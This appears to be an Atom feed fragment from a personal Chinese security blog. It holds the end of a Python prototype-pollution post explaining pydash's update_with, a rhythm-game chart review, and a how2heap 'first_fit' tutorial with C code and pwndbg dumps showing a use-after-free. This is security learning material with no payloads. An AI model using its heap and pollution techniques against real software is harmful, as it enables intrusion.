class="comment">#如果path_obj仍然是None，则调用default_factory来创建一个新的对象，并将其赋值给path_obj。</span></span><br><span class="line">    <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#使用base_set函数将path_obj设置到target对象的key位置上，且不允许覆盖</span></span><br><span class="line">    base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#尝试重新获取target对象中key对应的值，如果失败，会捕获TypeError。在捕获异常的处理中，尝试将key作为索引来直接从target中获取元素。如果这也失败，则标记为失败（_failed = True）并抛出一个包含原始异常信息的TypeError。</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">            _failed = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> _failed:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>​这个  <code>update_with</code>  函数的作用可以总结如下：</p><ol><li><strong>更新嵌套对象</strong>：函数用于在给定的  <code>obj</code> （一个列表或字典）中按照  <code>path</code>  指定的路径更新一个值。</li><li><strong>路径处理</strong>： <code>path</code>  可以是一个字符串或键的列表，描述了要修改的对象路径。</li><li><strong>自定义更新</strong>： <code>updater</code>  是一个可调用对象，它用于生成更新后的值。如果  <code>updater</code>  不是一个可调用对象，它会被转换为一个返回常量值的函数。</li><li><strong>自定义值生成</strong>： <code>customizer</code>  是一个可选的可调用对象，它用于自定义路径上的对象值。如果  <code>customizer</code>  返回  <code>None</code> ，则路径上的对象值由函数本身处理。</li><li><strong>自定义参数</strong>： <code>customizer</code>  被调用时接收三个参数： <code>(nested_value, key, nested_object)</code> 。</li><li><strong>递归创建路径</strong>：函数递归地遍历  <code>path</code> ，创建路径上的对象，如果路径上的对象不存在，则使用  <code>default_factory</code>  创建。</li><li><strong>更新最终值</strong>：遍历完成后，使用  <code>updater</code>  更新路径最终位置上的值。</li><li><strong>错误处理</strong>：如果在获取或设置路径上的值时遇到  <code>TypeError</code> ，函数会尝试使用整数索引访问，如果仍然失败，则抛出异常。</li><li><strong>原地修改</strong>： <code>obj</code>  是直接在原对象上进行修改的，而不是返回一个新的对象。</li><li><strong>返回值</strong>：函数返回修改后的  <code>obj</code> 。</li></ol><p>​简而言之， <code>update_with</code>  函数根据提供的路径，使用自定义逻辑递归地创建或更新一个嵌套的列表或字典中的值，并在路径的最终位置应用一个更新函数。</p><h1 id="参考文章"><a class="markdownIt-Anchor" href="#参考文章">#</a> 参考文章：</h1><h2 id="基础资料"><a class="markdownIt-Anchor" href="#基础资料">#</a> 基础资料</h2><p><span class="exturl" data-url="aHR0cHM6Ly9wYXp1cmlzLmNuLzIwMjMvMDcvMjcvUHl0aG9uJUU1JThFJTlGJUU1JTlFJThCJUU5JTkzJUJFJUU2JUIxJUExJUU2JTlGJTkzLw==">Python 原型链污染</span></p><p><strong><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTg3Ni8jdG9jX180">Python 原型链污染变体 (prototype-pollution-in-python)</span></strong></p><p><span class="exturl" data-url="aHR0cHM6Ly9mdXJpbmEub3JnLmNuLzIwMjMvMTIvMTgvcHJvdG90eXBlLXBvbGx1dGlvbi1pbi1weWRhc2gtY3RmLyMlRTQlQkIlQTMlRTclQTAlODElRTglQjAlODMlRTglQUYlOTU=">Pydash 原型链污染</span></p><h2 id="做题参考"><a class="markdownIt-Anchor" href="#做题参考">#</a> 做题参考：</h2><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTQ2MjA/dGltZV9fMTMxMT1HcUFoWUswS0JLOEQlMkZEMGx0ZEdRNTVNRFJvdEl0ZUQ=">从 CISCN2024 的 sanic 引发对 python “原型链” 的污染挖掘</span></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3huZ3huZ3huL3AvMTgyMDUyMzU=">CISCN2024-WEB-Sanic gxngxngxn    </span></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;python原型链污染&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#python原型链污染&quot;&gt;#&lt;/a&gt; python 原型链污染&lt;/h1&gt;
&lt;p&gt;​		后面会有跟着 Article_kelp 慢慢操作的，前面先面向题目学习。&lt;/p&gt;</summary>
      
    
    
    
    <category term="Web狗的自我安慰" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>arcaea闲谈</title>
    <link href="http://blog.g01den.top/posts/ef2fddc9.html"/>
    <id>http://blog.g01den.top/posts/ef2fddc9.html</id>
    <published>2024-06-27T09:36:38.000Z</published>
    <updated>2024-06-28T05:42:45.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-关于我对这些谱面的评价"><a class="markdownIt-Anchor" href="#1-关于我对这些谱面的评价">#</a> 1、关于我对这些谱面的评价：</h1><p>​我只会挑一些我印象比较深的谱面来说。</p><h2 id="19"><a class="markdownIt-Anchor" href="#19">#</a> &lt;1&gt;9+：</h2><h3 id="1sulfer硫磺"><a class="markdownIt-Anchor" href="#1sulfer硫磺">#</a> （1）sulfer（硫磺）：</h3><p>​<img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1343.PNG" alt="IMG_1343"></p><p>​9 + 首 pm 的歌，神谱无需多言，大量的地面交互以及天地交互虽然给不少花紫人带来了巨大的挑战，但是，身为一首 9+，它给我们带来的不只是交互力的提升，还有任我们疯狂压榨的 ptt，在我花紫以及红框时期，这谱给我的 ptt 带来了至少 0.2 的提升妥妥的榨汁机。</p><h2 id="210"><a class="markdownIt-Anchor" href="#210">#</a> &lt;2&gt;10：</h2><h3 id="1sheriruth黑魔王"><a class="markdownIt-Anchor" href="#1sheriruth黑魔王">#</a> （1）sheriruth（黑魔王)：</h3><p><img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1345.PNG" alt=""></p><p>​谱确实不错，但是，耐不住我在花紫甚至没到花紫的时候高强度越级导致了手癖，最后一直收不了。</p><p>​总的来说下吧，前面的交互很不错，要求一定的协调性，以及要求一定的底力。在我严重手癖的情况下感觉尾杀稍微有点脑裂以外，其他的整体很不错，神谱。</p><h3 id="2"><a class="markdownIt-Anchor" href="#2">#</a> （2）</h3><h2 id="310"><a class="markdownIt-Anchor" href="#310">#</a> &lt;3&gt;10+：</h2><h3 id="1cyaegha绿魔王"><a class="markdownIt-Anchor" href="#1cyaegha绿魔王">#</a> （1）Cyaegha（绿魔王）：</h3><p><img data-src="https://gitee.com/gou-dengyue/images/raw/master/IMG_1127.PNG" alt="IMG_1127"></p><p>​神谱。前面双押海虽然很让人脑裂，但是，只要习惯外加背谱来打的话，就会发现，并没有那么难了，并且这谱后面爽到极致，尾杀部分难度甚至感觉不如某些 10.0，纯纯的爽谱，在爽谱中排名前列。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-关于我对这些谱面的评价&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-关于我对这些谱面的评价&quot;&gt;#&lt;/a&gt; 1、关于我对这些谱面的评价：&lt;/h1&gt;
&lt;p&gt;​		我只会挑一些我印象比较深的谱面来说。&lt;/p&gt;
&lt;h2 id=&quot;19&quot;</summary>
      
    
    
    
    <category term="发电日常" scheme="http://blog.g01den.top/categories/Daily/"/>
    
    
    <category term="Daily life" scheme="http://blog.g01den.top/tags/Daily-life/"/>
    
  </entry>
  
  <entry>
    <title>how2heap_zh</title>
    <link href="http://blog.g01den.top/posts/2c0210e1.html"/>
    <id>http://blog.g01den.top/posts/2c0210e1.html</id>
    <published>2024-06-25T08:28:04.000Z</published>
    <updated>2024-06-28T05:41:13.455Z</updated>
    
    <content type="html"><![CDATA[<p>​由于 Pwn 的堆方向感觉异常抽象，所以，我想着通过 how2heap 这个项目来入门 heap。但是，由于有的程序不知为何调试总是出问题，不过，我会慢慢来解决的，所以这个文章也是处于慢慢更新的状态。</p><p>​glibc 版本：最新</p><p>​源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;glibc 使用首次适应算法选择空闲的堆块\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;如果有一个空闲堆块且足够大，那么 malloc 将选择它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;如果存在 use-after-free 的情况那可以利用这一特性\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;首先申请两个比较大的 chunk\n&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line">    <span class="type">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line">    <span class="type">char</span>* c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第一个 a = malloc(0x512) 在: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第二个 a = malloc(0x256) 在: %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们可以继续分配\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在我们把 \&quot;AAAAAAAA\&quot; 这个字符串写到 a 那里 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">&quot;AAAAAAAA&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第一次申请的 %p 指向 %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;接下来 free 掉第一个...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第三次 c = malloc(0x500) 在: %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们这次往里写一串 \&quot;CCCCCCCC\&quot; 到刚申请的 c 中\n&quot;</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">&quot;CCCCCCCC&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第三次申请的 c %p 指向 %s\n&quot;</span>, c, c);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;第一次申请的 a %p 指向 %s\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 \&quot;CCCCCCCC\&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​编译一下： <code>gcc -g first_fit.c</code></p><p>​运行一下看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:~/Temp$ ./heap</span><br><span class="line">尽管这个例子没有演示攻击效果，但是它演示了 glibc 的分配机制</span><br><span class="line">glibc 使用首次适应算法选择空闲的堆块</span><br><span class="line">如果有一个空闲堆块且足够大，那么 malloc 将选择它</span><br><span class="line">如果存在 use-after-free 的情况那可以利用这一特性</span><br><span class="line">首先申请两个比较大的 chunk</span><br><span class="line">第一个 a = malloc(0x512) 在: 0x5595c3a182a0</span><br><span class="line">第二个 a = malloc(0x256) 在: 0x5595c3a187c0</span><br><span class="line">我们可以继续分配</span><br><span class="line">现在我们把 <span class="string">&quot;AAAAAAAA&quot;</span> 这个字符串写到 a 那里</span><br><span class="line">第一次申请的 0x5595c3a182a0 指向 AAAAAAAA</span><br><span class="line">接下来 free 掉第一个...</span><br><span class="line">接下来只要我们申请一块小于 0x512 的 chunk，那就会分配到原本 a 那里: 0x5595c3a182a0</span><br><span class="line">第三次 c = malloc(0x500) 在: 0x5595c3a182a0</span><br><span class="line">我们这次往里写一串 <span class="string">&quot;CCCCCCCC&quot;</span> 到刚申请的 c 中</span><br><span class="line">第三次申请的 c 0x5595c3a182a0 指向 CCCCCCCC</span><br><span class="line">第一次申请的 a 0x5595c3a182a0 指向 CCCCCCCC</span><br><span class="line">可以看到，虽然我们刚刚看的是 a 的，但它的内容却是 <span class="string">&quot;CCCCCCCC&quot;</span></span><br></pre></td></tr></table></figure><p>​开始调试：</p><p>​首先，最开始，在第一次 malloc 分配内存之前，使用 vmmap 查看内存布局：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p>​明显，这里不存在 heap 段，进行 malloc 之后，发现多出来了个 heap 段：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555554000     0x555555555000 r--p     1000      0 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555555000     0x555555556000 r-xp     1000   1000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555556000     0x555555557000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555557000     0x555555558000 r--p     1000   2000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555558000     0x555555559000 rw-p     1000   3000 /home/g01den/Temp/how2heap/first</span><br><span class="line">    0x555555559000     0x55555557a000 rw-p    21000      0 [heap]</span><br><span class="line">    0x7ffff7dcb000     0x7ffff7ded000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7ded000     0x7ffff7f65000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7fb3000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb7000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb9000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbf000 rw-p     6000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p>​先查看下 chunk 有些啥？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x520 (with flag bits: 0x521)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555597b0</span><br><span class="line">Size: 0x260 (with flag bits: 0x261)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559a10</span><br><span class="line">Size: 0x205f0 (with flag bits: 0x205f1)</span><br></pre></td></tr></table></figure><p>​根据下面两个输出：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第一个 a = malloc(0x512) 在: 0x5555555592a0</span><br><span class="line">第二个 a = malloc(0x256) 在: 0x5555555597c0</span><br></pre></td></tr></table></figure><p>​可以看出来，上面那个 heap 结构中，第二个为 a 所在地址，第三个为 b 所在地址，为啥上下看到的地址不同，这个主要是和 malloc 函数返回指针的地址有关，这个这儿就不细说了。</p><p>​在把 AAAAAAAA 这个字符串写入 a 中，我们看看 a 的内存布局：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000521</span><br><span class="line">0x5555555592a0: 0x4141414141414141      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​可以看出来，已经成功写入了，先 free 掉 a，之后 malloc 一个比 a 小一点的，把这个地址赋给 c，可以看出，输出的时候发现 a 原本的地址和 c 的地址相等：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一个 a = malloc(0x512) 在: 0x5555555592a0</span></span><br><span class="line"> 第三次 c = malloc(0x500) 在: 0x5555555592a0</span><br></pre></td></tr></table></figure><p>​之后将 CCCCCCCC 写入 c 的地址，之后通过 a 和 c 输出试试看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三次申请的 c 0x5555555592a0 指向 CCCCCCCC</span><br><span class="line">第一次申请的 a 0x5555555592a0 指向 CCCCCCCC</span><br></pre></td></tr></table></figure><p>​当释放了一块内存之后再去申请一个大小略小的空间，那么 glibc 倾向于将先前释放的空间重新分配，由于 a 的指针没有被置零，这就造成了可以直接通过 a 来访问已经 free 掉的 chunk 和重新分配好的略小的 chunk，由此，造成了 UAF 漏洞。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		由于 Pwn 的堆方向感觉异常抽象，所以，我想着通过 how2heap 这个项目来入门 heap。但是，由于有的程序不知为何调试总是出问题，不过，我会慢慢来解决的，所以这个文章也是处于慢慢更新的状态。&lt;/p&gt;
&lt;p&gt;​		glibc 版本：最新&lt;/p&gt;
&lt;p&gt;​		源</summary>
      
    
    
    
    <category term="Pwn手的自我修养" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
</feed>
